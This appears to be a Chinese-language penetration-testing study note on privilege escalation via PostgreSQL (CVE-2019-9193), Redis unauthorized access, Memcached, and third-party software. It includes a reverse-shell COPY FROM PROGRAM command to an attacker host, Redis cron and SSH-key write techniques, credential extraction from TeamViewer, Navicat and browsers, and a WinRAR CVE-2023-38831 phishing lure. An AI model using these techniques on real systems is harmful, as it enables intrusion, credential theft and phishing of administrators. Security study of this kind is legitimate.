---
title: "系统提权：PostgreSQL、Redis、第三方应用、密码凭据"
pubDate: 2026-08-19
tags:
  - 安全
  - 提权
---

一条是 Linux 上的数据库提权（PostgreSQL/Redis/Memcached，PostgreSQL 和 Redis ），一条是拿到计算机用户后从第三方软件里抠凭据、放钓鱼文件等管理员触发。链：Web 权限 → 数据库权限 → 计算机系统权限，第三方软件那条线是从"计算机用户权限"往上走

## 三个数据库

| 数据库 | 类型 | 端口 | 账号 | 默认外连 |
|---|---|---|---|---|
| PostgreSQL | 对象-关系型 ORDBMS | 5432 | postgres | 否 |
| Redis | 内存键值存储 | 6379 | 无默认账密 | 是 |
| Memcached | 分布式内存对象缓存 | 11211 | 无认证机制 | 是 |

## PostgreSQL 提权

**提权条件**：知道数据库账号密码（怎么拿：SQL注入、源码配置文件、备份文件、爆破）

**提权**：

1. CVE-2019-9193（COPY FROM PROGRAM 特性滥用）——主力
2. UDF 自定义函数：和 MySQL 一个思路，但基本用不了
3. libc 路线：pg ≤ 8.2 才行，也基本用不了

**关于 CVE-2019-9193**：`COPY ... FROM PROGRAM` 是 PostgreSQL 的正常功能——设计给管理员导数据用的，本身就能执行系统命令

**手工提权**：假设已经拿到账密，Navicat 直连，打开命令列界面执行（以 id 命令为例）：

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

拆开看每一步：

- 前两行建一张临时表 `cmd_exec` 存输出
- 第三行 `COPY ... FROM PROGRAM 'id'`：让数据库起一个子 shell 执行 id，把 stdout 写进表里——这就是命令执行本体
- 第四行把结果查出来

查到 `uid=...postgres` 的输出就是成功。确认能执行后，把 id 换成反弹 shell 语句拿会话

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/攻击机IP/端口 0>&1"';
SELECT * FROM cmd_exec;
```

攻击机先 `nc -lvnp 端口` 挂着等回连即可

**工具提权（MDUT）**：`java8 -jar` 启动 → 添加 PostgreSQL 连接（地址/端口/账密）→ 进去后能看到 CVE/UDF/libc 三种提权方式，只有默认选中的 CVE 能成功，UDF 和 libc 都会报错

## Redis 提权

**提权条件**：未授权访问，或有密码连接后执行

**提权技术**：写密钥 SSH、写计划任务（基本用这个）、写反弹 Shell、CVE-2022 沙盒执行

```shell
sudo wget http://download.redis.io/releases/redis-2.8.17.tar.gz
tar xzf redis-2.8.17.tar.gz
cd redis-2.8.17
make
cd src
./redis-server
```

选 2.8.17 这种老版本是有讲究的：无密码、无 protected-mode（新版本默认开启，会拒绝非本机连接），起服务就直接是未授权状态

**手工提权原理**：核心是四个命令的组合——`config set dir 目录` 切到目标目录、`config set dbfilename 文件名` 把 RDB 快照存成指定名字、`set key "内容"` 塞 payload、`save` 落盘。相当于把"数据库备份"变成"任意文件写入"。三种经典落盘姿势：

1. **写 SSH 公钥**（目标开着 sshd）：dir 切到 `/root/.ssh`，写 `authorized_keys`，然后直接 ssh 免密登录
2. **写计划任务**（最常用）：dir 切到 `/var/spool/cron`（Ubuntu 是 `/var/spool/cron/crontabs`），文件名写 root，内容一行反弹（前后加 \n\n 防脏数据）
3. **写 Webshell**：知道 Web 路径（比如 /var/www/html）时 dir 切过去写，配合蚁剑

**工具提权**：

- **MDUT**：Redis 没用户概念默认没密码，直接空密码连。提供三种利用方式正好对应上面三种写文件，推荐计划任务——界面里把远程 IP 和端口改成攻击机的监听信息，点写入后等回连就行
- **RequestTemplate**：提供新的命令执行方式（对应 CVE-2022-0543 沙盒逃逸那类），但有一定利用条件（对 Redis 版本、是否是 Debian/Ubuntu 打包版有要求），实战两款结合用，一个不行换另一个

## Memcached

本身就是个简单 key-value 缓存，**没有提权的说法**。但它无认证机制——开发者要是把后台账密、接口密钥这类敏感信息塞在里面，连上就能直接翻：

- fofa 找目标：`port="11211"`
- 连上后的常用操作：`stats` 看状态、`stats items` 看有哪些条目、`get 键名` 读值
- RequestTemplate 支持直接连接 Memcached
- 实测随便挑几个：都能连成功，但基本翻不到任何信息

## 第三方软件提权（计算机用户权限）

**场景**：实战/HW 里通过钓鱼、社工拿到公司内网的用户/服务器主机权限后，看目标装了什么第三方软件再下手：

```shell
远控类：Teamviewer 向日葵 Todesk VNC Radmin 等
密码类：各大浏览器 Xshell Navicat 3389 等
服务类：FileZilla Serv-u Zend 等
文档类：Winrar WPS Office 等
```

通过普通用户或 Web 用户收集/提取有价值凭据进行提升（下面前三个软件）
通过普通用户或 Web 用户上传钓鱼文件，等管理员触发提升（WinRAR）

虚拟机装对应软件，CS 上线（选 CS 是因为它的插件生态能直接对这些第三方软件做提取利用，MSF 也行但没现成插件点起来方便）

### TeamViewer（要计算机用户权限）

目标机装符合版本要求的 TeamViewer（老版本密码存本地可解，新版本有加固），CS 插件直接读取它的登录凭证，拿到 ID + 密码。电脑开 TeamViewer 客户端，输入对方的 ID 和密码连接——等于接管了对方的远控，后续所有操作都走 TeamViewer 的合法加密流量

### NavicatPremium（要计算机用户权限）

目标机装 Navicat 且连接过数据库，连接配置里保存的账密（Navicat 本地加密存储，密钥公开可逆）被 CS 插件提取出来，直接拿到数据库的账号密码。注意这个不能通过 Web 权限拿到，必须是计算机用户权限——因为要翻的是本地用户目录下的配置文件，Webshell 不

### 浏览器密码凭据（要高权限用户）

Edge/Chrome 都有密码保存和自动填充功能，凭据存本地。拿到对方高权限用户后用工具提取——必须高权限，因为要创建文件夹并运行文件，低权限跑不起来。提取后 result 目录下会有各浏览器的密码文件，下载回来打开就是明文密码，再去登对应网站（邮箱、OA、云控制台、VPN）扩大

### WinRAR CVE-2023-38831（计算机用户或 Web 权限都行）

RARLAB WinRAR 代码执行漏洞，原理卷名欺骗：压缩包里塞"同名但类型不同"的条目，WinRAR 处理这种结构的逻辑有缺陷——用户双击打开看起来正常的 pdf，实际执行的是同名的 bat 但 WinRAR 收费、很多人用破解版、破解版没法自动升级

利用流程：

1. 准备文件：一个正常的 pdf（诱饵，比如"工资调整方案.pdf"）、一个 bat（里面写执行 cs.exe 的命令）、一个 python 打包脚本（网上公开的 exp 脚本）
2. python 脚本把 bat 和 pdf 打包成漏洞利用需要的特殊目录结构（生成五个文件）
3. 把生成的五个文件用 WinRAR 压缩成 .rar
4. 想办法投递到目标主机（聊天工具传、邮件附件、共享目录）
5. 诱导目标双击 rar 里的 pdf 看文档——触发漏洞，实际跑的是 bat → cs.exe 执行 → 上线

这是钓鱼文件 管理员一双击就直接以他的权限执行了

## 要点

数据库这条线记口诀：PostgreSQL 有账密就打 CVE-2019-9193，Redis 未授权优先写计划任务，Memcached 无认证只能翻敏感信息赌。第三方软件这是拿主机后的第一件事——tasklist 看装了啥：远控抠 TeamViewer 凭证、密码类抠 Navicat/浏览器、文档类上 WinRAR 钓鱼包等管理员点 前提都是先有计算机用户权限
